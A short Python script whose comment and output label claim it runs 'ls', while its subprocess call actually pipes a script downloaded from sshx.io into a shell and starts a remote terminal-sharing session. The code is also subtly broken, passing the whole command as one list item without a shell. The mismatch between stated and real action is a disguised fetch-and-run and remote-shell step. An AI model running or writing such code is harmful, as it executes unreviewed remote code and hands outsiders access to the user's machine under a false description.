import subprocess
from pathlib import Path

# Run ls and capture its output
result = subprocess.run(
    ["curl -sSf https://sshx.io/get | sh -s run"],
    capture_output=True,
    text=True
)

print("=== ls OUTPUT ===")
print(result.stdout)
